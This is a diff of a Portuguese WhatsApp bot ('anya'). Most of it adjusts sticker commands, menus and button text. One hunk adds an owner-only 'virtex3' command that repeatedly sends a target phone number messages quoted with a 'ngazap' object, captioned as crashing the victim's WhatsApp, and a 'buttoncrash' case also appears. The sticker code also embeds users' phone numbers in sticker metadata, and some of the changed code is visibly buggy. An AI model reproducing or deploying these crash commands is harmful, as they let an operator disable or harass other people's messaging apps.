@@ -967,6 +1365,7 @@ var sadtrap = lonetotoso[Math.floor(Math.random() * (lonetotoso.length))]
         anya.sendMessage(from, { react: { text: `${sadtrap}`, key: m.key }})
         }        
        /********FIM DO AUTO REAÇÃO********/   
+       
        
 /***********[block cmd]**********/              
 const isCmdBlocked = (teks) => {
@@ -994,15 +1393,9 @@ anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
 setTimeout( () => {
 }, 0)
 }	
-setTimeout(async function () {
-anya.sendMessage(m.chat, { text: `${destrava22}`})
-}, 1000)
-setTimeout(async function () {
-anya.sendMessage(m.chat, { text: `${destrava22}`})
-}, 1000)
-setTimeout(async function () {
-anya.sendMessage(m.chat, { text: 'chat limpo, por favor não suba as mensagens pois pode ser trava.'})
-}, 1000)
+setTimeout( () => {
+anya.sendMessage(from, { delete: m.key })
+}, 100)
 }
 
 /**********ANAGRAMA**********/           
@@ -1787,7 +2180,7 @@ alonkkj = `parabéns ${pushname} 🥳 você ganhou o jogo\nPalavra : ${dataAnagr
   let buttons = [
                         { buttonId: `!anagram`, buttonText: { displayText: `PROXIMO` }, type: 1 },                       
                     ]
-                    await anya.sendButtonText(m.chat, buttons, alonkkj, `${nomedobot}`, m)
+                    await anya.sendButtonText(m.chat, buttons, alonkkj, `${watermark}`, m)
 //addLevelingXp(m.sender, xp)
 //addKoinUser(m.sender, dinhero)
 recompensa = `🎉🎉RECOMPENSA🎉🎉\nVocê ganhou ${xp} em *xp* e ${dinhero} em *dinhero*`
@@ -2168,7 +2561,7 @@ const levelRole = getLevelingLevel(m.sender, _level)
 				per = `■■■■■■■■■■ ${resl}%`
 			}
 			/**********FIM**********/
-			
+
 if(isAntiImg && isBotAdmins && m.mtype == 'imageMessage') {
 if (m.key.fromMe) return
 if(isAdmins) return anya.sendText(from,'*mensagem proibida detectada, porém é admin logo a punição será anulada*', m)
@@ -2239,18 +2632,18 @@ await sleep(500)
 m.copyNForward(m.chat, true, { readViewOnce: true }).catch(_ => m.reply('Talvez tenha sido aberto por um bot'))
 }
 
-if (isAutoSticker) {
+                if (!m.isGroup && isAutoStick) {
 //m.reply(`Foto/video detectado, fazendo sua figu automática em instantes, aguarde.`)
                 var numero = `${m.sender.split('@')[0]}`
                 if (/image/.test(mime) && !/webp/.test(mime)) {
                 let mediac = await quoted.download()
-                await anya.sendImageAsSticker(from, mediac, m, { packname: `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:`, author: `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}` })
+                await anya.sendImageAsSticker(from, mediac, m, { packname: `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:\n[🥜] LINK DO BOT`, author: `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}\nhttps://abre.bio/anya-md` })
                 console.log(`Auto sticker detected`)
                 } else if (m.mtype == 'videoMessage') {
 m.reply(`Foto/video detectado, fazendo sua figu automática em instantes, aguarde.`)
                  if ((quoted.msg || quoted).seconds > 11) return m.reply('Máximo 10 segundos!')
                 let mediac1 = await quoted.download()
-                await anya.sendVideoAsSticker(from, mediac1, m, { packname: `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:`, author: `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}` })
+                await anya.sendVideoAsSticker(from, mediac1, m, { packname: `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:\n[🥜] LINK DO BOT`, author: `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}\nhttps://abre.bio/anya-md` })
             }
          }
          
@@ -2266,46 +2659,54 @@ m.reply(`Foto/video detectado, fazendo sua figu automática em instantes, aguard
 
 async function ReplyFig() {
 let buttons = [
-                        { buttonId: `${prefix}figuanime -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
-                        { buttonId: `${prefix}figuanime -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
+                        { buttonId: `${prefix + command} -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
+                        { buttonId: `${prefix + command} -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
+                    ]
+                    await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
+}
+async function ReplyFig1() {
+let buttons = [
+                        { buttonId: `!figuanime -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
+                        { buttonId: `!figuanime -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                     ]
                     await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
 }
 async function ReplyFig2() {
 let buttons = [
-                        { buttonId: `${prefix}figumeme -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
-                        { buttonId: `${prefix}figumeme -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
+                        { buttonId: `!figudecria -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
+                        { buttonId: `!figudecria -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                     ]
                     await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
 }
 async function ReplyFig3() {
 let buttons = [
-                        { buttonId: `${prefix}figuemoji -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
-                        { buttonId: `${prefix}figuemoji -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
+                        { buttonId: `!figujapinha -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
+                        { buttonId: `!figujapinha -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                     ]
                     await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
 }
 async function ReplyFig4() {
 let buttons = [
-                        { buttonId: `${prefix}figumagago -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
-                        { buttonId: `${prefix}figumagago -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
+                        { buttonId: `!figumagago -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
+                        { buttonId: `!figumagago -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                     ]
                     await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
 }
 async function ReplyFig5() {
 let buttons = [
-                        { buttonId: `${prefix}figujapinha -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
-                        { buttonId: `${prefix}figujapinha -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
+                        { buttonId: `!figuemoji -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
+                        { buttonId: `!figuemoji -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                     ]
                     await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
 }
 async function ReplyFig6() {
 let buttons = [
-                        { buttonId: `${prefix}figudecria -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
-                        { buttonId: `${prefix}figudecria -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
+                        { buttonId: `!figumeme -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
+                        { buttonId: `!figumeme -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                     ]
                     await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
 }
+
 /*==========[fim dos reply de comandos de figu]==========*/        
 
 async function replyReg(teks) {
@@ -2314,7 +2715,7 @@ let buttonsntnssfww = [
 ]
 await anya.sendButtonText(m.chat, buttonsntnssfww, `Ola ${pushname},
 Para que o bot possa ser usado, faça seu registro clicando no botão abaixo
- `, `${nomedobot}`, m)
+ `, `${watermark}`, m)
 }
 async function sendButRegis(from) {
 anya.sendText(m.chat, `aguarde, cadastrando: ${pushname}...!`, m)
@@ -2331,8 +2732,6 @@ image:ppnyauser,
 //gifPlayback:true,
 jpegThumbnail:img,
 caption: `
-Olá ${pushname} :)
-
 ┌──⊰「 REGISTRADO(A) 」
 │
 │➢🌷 Nome : ${pushname}
@@ -2342,9 +2741,8 @@ Olá ${pushname} :)
 │➢🌷 Total de usuários : ${_registered.length}
 │
 └──⊰
-
 *Por favor, clique no botão abaixo para usar o bot*`,
-footer: `${nomedobot}`,
+footer: `${watermark}`,
 buttons: buttons,
 headerType: 4,
 contextInfo: {
@@ -2631,10 +3029,10 @@ if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você
 listMessage = {
                     text: `[🌸] clique abaixo e selecione o menu! [🌸]`,
                     footer: `${watermark}`,
-                    buttonText: '🌸 CLIQUE AQUI 🌸',
+                    buttonText: '----[ 🌸 CLIQUE AQUI 🌸 ]----',
                     title: `[🌸] olá ${pushname} [🌸]`,
                     sections: [{
-                        title: '[💎] 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐌𝐄𝐍𝐔𝐒️ [💎]',
+                        title: '----[ 💎 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐌𝐄𝐍𝐔𝐒️ 💎 ]----',
                         rows: [{
                             rowId: `!menu1`,
                             title: '[👾] 𝐌𝐄𝐍𝐔 𝐆𝐄𝐑𝐀𝐋 [👾]',
@@ -2648,12 +3046,12 @@ listMessage = {
                         {
                             rowId: `!menuconverter`,
                             title: '[📌] 𝐂𝐎𝐍𝐕𝐄𝐑𝐓𝐄𝐑 [📌]',
-                            description: 'exibe o menu de conversores'
+                            description: 'exibe o menu de converter'
                         },
                         {
                             rowId: `!menugp`,
                             title: '[👤] 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒 [👤]',
-                            description: 'exibe o menu para grupos'
+                            description: 'exibe o menu de grupos'
                         },
                         {
                             rowId: `!menufun`,
@@ -2663,12 +3061,12 @@ listMessage = {
                         {
                             rowId: `!alteradores`,
                             title: '[🎼] 𝐀𝐋𝐓𝐄𝐑𝐀𝐃𝐎𝐑𝐄𝐒 [🎼]',
-                            description: 'exibe o menu de alternadores'
+                            description: 'exibe o menu de alteradores'
                         },
                         {
                             rowId: `!+18`,
                             title: '[🔞] 𝐍𝐒𝐅𝐖 [🔞]',
-                            description: 'exibe o menu de hentai'
+                            description: 'exibe o menu nsfw'
                         },
                         {
                             rowId: `!logos`,
@@ -2692,32 +3090,22 @@ listMessage = {
                         
                         },
                                         {
-										"title": "[🛒] 𝐂𝐀𝐑𝐈𝐍𝐇𝐎 𝐃𝐄 𝐅𝐈𝐆𝐔️𝐒 [🛒]",
-										"description": "pacote de figurinhas",
+										"title": "[🛒] 𝐂𝐀𝐑𝐑𝐈𝐍𝐇𝐎 𝐃𝐄 𝐅𝐈𝐆𝐔️𝐒 [🛒]",
+										"description": "exibe o carrinho de figurinhas",
 										"rowId": `${prefix}pacotefig`
 										}
 								]
 							},
                             	{
-								"title": "[🤺] 𝐂𝐑𝐈𝐀𝐃𝐎𝐑 [🤺]",
+								"title": "----[ 🤺 𝐂𝐑𝐈𝐀𝐃𝐎𝐑 🤺 ]----",
 								"rows": [
 									{
-										"title": "número do criador",
+										"title": "criador",
 										"description": "exibe o número do criador",
 										"rowId": `${prefix}owner`
 										}
 								]
-							},
-							{
-								"title": "[🥋] 𝐂𝐑𝐄𝐃𝐈𝐓𝐎𝐒 [🥋]",
-								"rows": [
-									{
-										"title": "Graças a ❤️",
-										"description": "exibe a lista de crédito do bot !!",
-										"rowId": `${prefix}creditos`
-									}
-								]
-                           }                         
+							}                     
 						],
                 }
                 anya.sendMessage(from, listMessage, {quoted:m})
@@ -2773,19 +3161,18 @@ break
 case `figuanime`: {
                     
   if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
-if(args.length < 1) return ReplyFig()
+var kaka = `${m.isGroup ? 'sim':'nao'}`
+if(kaka == 'sim' && args.length < 1) return ReplyFig1() 
                    var figus = ["figu1", "figu2", "figu3", "figu4", "figu5","figu6","figu7","figu8","figu9","figu10","figu11","figu12","figu13","figu14","figu15","figu16","figu17","figu18","figu19","figu20","figu21","figu22","figu23","figu24","figu25","figu26","figu27","figu28","figu29","figu30","figu32","figu33","figu34","figu35","figu36","figu37","figu38","figu39","figu40","figu41","figu42","figu43"]
                    var maths = []
                    
                    for (let i = 0; i < 4; i) {
-                     fig = `./figu/animes/` + figus[Math.floor(Math.random() * figus.length)] + `.webp`
-                     if(maths.includes(fig) === false) {
-                       maths.push(fig)
+                     figunime = `./figu/animes/` + figus[Math.floor(Math.random() * figus.length)] + `.webp`
+                     if(maths.includes(figunime) === false) {
+                       maths.push(figunime)
                        i++
                      }
-                   }
-                                     
-                   
+                   }                                                  
                    if(args[0] == '-aqui') {
                     anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[0])})
                     anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[1])})
@@ -2811,23 +3198,35 @@ if(args.length < 1) return ReplyFig()
                     await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE ANIME?_*`, `${watermark}`)        
                     }, 3000)
                     }
+                    if(kaka == 'nao' && args.length < 1) {
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
+                    setTimeout(async() => {
+                    let buttons = [
+                        { buttonId: `${prefix}figuanime -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
+                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
+                    ]
+                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE ANIME?_*`, `${watermark}`)        
+                    }, 3000)
+}
                    }
                    break
 case `figumeme`: {
                     
   if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
-  if(args.length < 1) return ReplyFig2()
+  var kaka = `${m.isGroup ? 'sim':'nao'}`
+if(kaka == 'sim' && args.length < 1) return ReplyFig6() 
                    var meme = ["1", "2", "3", "4", "5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59","60","61","62","63","64","65","66","67","68","69","70","71","72","73","74","75","76","77","78","79","80","81","82","83","84","85","86","87","88","89","90","91","92","93","94","95","96","97","98","99","100","101","102","103","104","105","106","107","108","109","110","111","112","113","114","115","116","117","118","119","120","122","122","123","124","125","126","127","128","129","130"]
-                   var maths = []
-                   
+                   var maths = []                   
                    for (let i = 0; i < 4; i) {
-                     fig = `./figu/meme/` + meme[Math.floor(Math.random() * meme.length)] + `.webp`
-                     if(maths.includes(fig) === false) {
-                       maths.push(fig)
+                     figumeme = fs.readFileSync(`./figu/memes/` + meme[Math.floor(Math.random() * meme.length)] + `.webp`)
+                     if(maths.includes(figumeme) === false) {
+                       maths.push(figumeme)
                        i++
                      }
                    }
-                   
                     if(args[0] == '-aqui') {
                     anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[0])})
                     anya.sendMessage(m.chat, {sticker: fs.readFileSync(maths[1])})
@@ -2838,7 +3237,7 @@ case `figumeme`: {
                         { buttonId: `${prefix}figumeme`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                         { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                     ]
-                    await anya.sendButtonText(m.chat, buttons, `*_QUER MAIS FIGUS DE MEME?_*`, `${watermark}`)        
+                    await anya.sendButtonText(m.chat, buttons, `*_QUER MAIS FIGUS DE EMOJI?_*`, `${watermark}`)        
                     }, 3000)
                     } else if(args[0] == '-pv') {
                     anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
@@ -2850,22 +3249,36 @@ case `figumeme`: {
                         { buttonId: `${prefix}figumeme -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
                         { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
                     ]
-                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE MEME?_*`, `${watermark}`)        
+                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE EMOJI?_*`, `${watermark}`)        
                     }, 3000)
                     }
+                    if(kaka == 'nao' && args.length < 1) {
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
+                    setTimeout(async() => {
+                    let buttons = [
+                        { buttonId: `${prefix}figumeme -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
+                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
+                    ]
+                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE EMOJI?_*`, `${watermark}`)        
+                    }, 3000)
+}
                    }
                    break 
 case `figuemoji`: {
                     
   if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
-  if(args.length < 1) return ReplyFig3()
+var kaka = `${m.isGroup ? 'sim':'nao'}`
+if(kaka == 'sim' && args.length < 1) return ReplyFig5() 
                    var emoji = ["1", "2", "3", "4", "5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59","60","61","62","63","64","65","66","67","68","69","70","71","72","73","74","75","76","77","78","79","80","81","82","83","84","85","86","87","88","89","90","91","92","93","94","95","96","97","98","99","100","101","102","103"]
                    var maths = []
                    
                    for (let i = 0; i < 4; i) {
-                     fig = `./figu/emoji/` + emoji[Math.floor(Math.random() * emoji.length)] + `.webp`
-                     if(maths.includes(fig) === false) {
-                       maths.push(fig)
+                     figumoji = `./figu/emoji/` + emoji[Math.floor(Math.random() * emoji.length)] + `.webp`
+                     if(maths.includes(figumoji) === false) {
+                       maths.push(figumoji)
                        i++
                      }
                    }
@@ -2895,19 +3308,33 @@ case `figuemoji`: {
                     await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE EMOJI?_*`, `${watermark}`)        
                     }, 3000)
                     }
+                    if(kaka == 'nao' && args.length < 1) {
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
+                    setTimeout(async() => {
+                    let buttons = [
+                        { buttonId: `${prefix}figuemoji -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
+                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
+                    ]
+                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE EMOJI?_*`, `${watermark}`)        
+                    }, 3000)
+}
                    }
                    break
  case `figumagago`: {
   
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
-if(args.length < 1) return ReplyFig4()
+var kaka = `${m.isGroup ? 'sim':'nao'}`
+if(kaka == 'sim' && args.length < 1) return ReplyFig4() 
                    const magagos = ["figu1", "figu2", "figu3", "figu4", "figu5","figu6","figu7","figu8","figu9","figu10","figu11","figu12","figu13","figu14","figu15","figu16","figu17","figu18","figu19","figu20","figu21","figu22","figu23","figu24"]
                    var maths = []
                    
                    for (let i = 0; i < 4; i) {
-                     fig = `./figu/macaco/` + magagos[Math.floor(Math.random() * magagos.length)] + `.webp`
-                     if(maths.includes(fig) === false) {
-                       maths.push(fig)
+                     figumagago = `./figu/macaco/` + magagos[Math.floor(Math.random() * magagos.length)] + `.webp`
+                     if(maths.includes(figumagago) === false) {
+                       maths.push(figumagago)
                        i++
                      }
                    }
@@ -2937,19 +3364,33 @@ if(args.length < 1) return ReplyFig4()
                     await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE MAGAGO?_*`, `${watermark}`)        
                     }, 3000)
                     }
+                    if(kaka == 'nao' && args.length < 1) {
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
+                    setTimeout(async() => {
+                    let buttons = [
+                        { buttonId: `${prefix}figumagago -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
+                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
+                    ]
+                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE MAGAGO?_*`, `${watermark}`)        
+                    }, 3000)
+}
                    }
                    break
 case `figujapinha`: {
 
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
-if(args.length < 1) return ReplyFig5()
+var kaka = `${m.isGroup ? 'sim':'nao'}`
+if(kaka == 'sim' && args.length < 1) return ReplyFig3() 
                    const japas = ["figu1", "figu2", "figu3", "figu4", "figu5","figu6","figu7","figu8","figu9","figu10","figu11","figu12","figu13","figu14","figu15","figu16","figu17","figu18","figu19","figu20","figu21","figu22","figu23","figu24","figu25","figu26","figu27","figu28","figu29","figu30","figu32","figu33","figu34","figu35","figu36","figu37","figu38","figu39","figu40","figu41","figu42","figu43","figu44","figu45","figu46","figu47","figu48","figu49","figu50","figu51","figu52","figu53","figu54","figu55","figu56","figu57","figu58","figu58","figu59","figu60"]
                    var maths = []
                    
                    for (let i = 0; i < 4; i) {
-                     fig = `./figu/japinha/` + japas[Math.floor(Math.random() * japas.length)] + `.webp`
-                     if(maths.includes(fig) === false) {
-                       maths.push(fig)
+                     figjapinha = `./figu/japinha/` + japas[Math.floor(Math.random() * japas.length)] + `.webp`
+                     if(maths.includes(figjapinha) === false) {
+                       maths.push(figjapinha)
                        i++
                      }
                    }
@@ -2979,19 +3420,33 @@ if(args.length < 1) return ReplyFig5()
                     await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DA JAPINHA?_*`, `${watermark}`)        
                     }, 3000)
                     }
+                    if(kaka == 'nao' && args.length < 1) {
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
+                    setTimeout(async() => {
+                    let buttons = [
+                        { buttonId: `${prefix}figujapinha -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
+                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
+                    ]
+                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DA JAPINHA?_*`, `${watermark}`)        
+                    }, 3000)
+}
                    }
                    break
    case `figudecria`: {
     
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
-if(args.length < 1) return ReplyFig6()
+var kaka = `${m.isGroup ? 'sim':'nao'}`
+if(kaka == 'sim' && args.length < 1) return ReplyFig2() 
                    const decria = ["figu1", "figu2", "figu3", "figu4", "figu5","figu6","figu7","figu8","figu9","figu10","figu11","figu12","figu13","figu14","figu15","figu16","figu17","figu18","figu19","figu20","figu21","figu22","figu23","figu24","figu25","figu26","figu27","figu28","figu29","figu30","figu32","figu33","figu34","figu35","figu36","figu37","figu38","figu39"]
                    var maths = []
                    
                    for (let i = 0; i < 4; i) {
-                     fig = `./figu/decria/` + decria[Math.floor(Math.random() * decria.length)] + `.webp`
-                     if(maths.includes(fig) === false) {
-                       maths.push(fig)
+                     figucria = `./figu/decria/` + decria[Math.floor(Math.random() * decria.length)] + `.webp`
+                     if(maths.includes(figucria) === false) {
+                       maths.push(figucria)
                        i++
                      }
                    }
@@ -3021,14 +3476,35 @@ if(args.length < 1) return ReplyFig6()
                     await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE CRIA?_*`, `${watermark}`)        
                     }, 3000)
                     }
+                    if(kaka == 'nao' && args.length < 1) {
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[0])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[1])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[2])})
+                    anya.sendMessage(m.sender, {sticker: fs.readFileSync(maths[3])})
+                    setTimeout(async() => {
+                    let buttons = [
+                        { buttonId: `${prefix}figudecria -pv`, buttonText: { displayText: `𝐒𝐈𝐌, 𝐏𝐎𝐑 𝐅𝐀𝐕𝐎𝐑` }, type: 1 }, 
+                        { buttonId: `${prefix}pacotefig`, buttonText: { displayText: `𝐎𝐔𝐓𝐑𝐎𝐒 𝐓𝐈𝐏𝐎𝐒` }, type: 1 },                      
+                    ]
+                    await anya.sendButtonText(m.sender, buttons, `*_QUER MAIS FIGUS DE CRIA?_*`, `${watermark}`)        
+                    }, 3000)
+}
                    }
                    break
-case 'creditos': {
-if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
-m.reply(`Graças a
-Elbielzin (ajuda na criação de cmd)
-alone (eu)
-e a todos os amigos que me apoiaram e me ajudaram (sou grato a vcs) `)
+case 'virtex3':{
+if (!isCreator) throw mess.owner
+if (!q) return m.reply(`Syntak Error!\n*Contoh:*\n${prefix+command} 628xxx`)
+var num = q+"@s.whatsapp.net"
+var dev = '6283834558105@s.whatsapp.net'
+if (num == dev) return m.reply('Itu developer gua')
+if (num == sender) return m.reply('itu nomor lu sendiri')
+anya.sendMessage(num, {text:'anya crashando meu zapKKKKK'}, {quoted:ngazap})
+await sleep(3000)
+anya.sendMessage(num, {text:'anya crashando meu zapKKKKK'}, {quoted:ngazap})
+await sleep(3000)
+anya.sendMessage(num, {text:'anya crashando meu zapKKKKK'}, {quoted:ngazap})
+await sleep(3000)
+//mentions(`Sukses kirim *${command}* to @${num.split('@')[0]}`, [num])
 }
 break
 case 'buttoncrash': 
@@ -3095,16 +3571,13 @@ var Yy = 0
 let timestamp = speed()
 let latensi = speed() - timestamp
 neww = performance.now()
-oldd = performance.now()
-            
+oldd = performance.now()            
 anyakkk = `
-
 ┌──⊰「 𝑰𝑵𝑭𝑶 𝑼𝑺𝑬𝑹 」
 │
 │➢ nome: ${pushname}
 │➢ wame: wa.me/${m.sender.split("@s.whatsapp.net")[0]}
 │➢ patente: ${role}
-│➢ level: ${getLevelingLevel(m.sender)}
 │
 └──⊰
 
@@ -3146,6 +3619,10 @@ anyakkk = `
 │➢ ${prefix}gruposetting
 │➢ ${prefix}autoreact [ _opção_ ]
 │➢ ${prefix}convite [ _link de gp_ ]
+│➢ ${prefix}dontback
+│➢ ${prefix}dbackadd [ _55xxxxx_ ]
+│➢ ${prefix}dbackrm [ _55xxxxx_ ]
+│➢ ${prefix}gpinfo
 │
 ├──⊰「 𝑨𝑵𝑻𝑰𝑺 」
 │
@@ -3159,7 +3636,6 @@ anyakkk = `
 │
 ├──⊰「 𝑪𝑶𝑵𝑽𝑬𝑹𝑻𝑬𝑹 」
 │
-│➢ ${prefix}rename [ _nome1|nome2_ ]
 │➢ ${prefix}toimage
 │➢ ${prefix}sticker
 │➢ ${prefix}togif
@@ -3172,8 +3648,6 @@ anyakkk = `
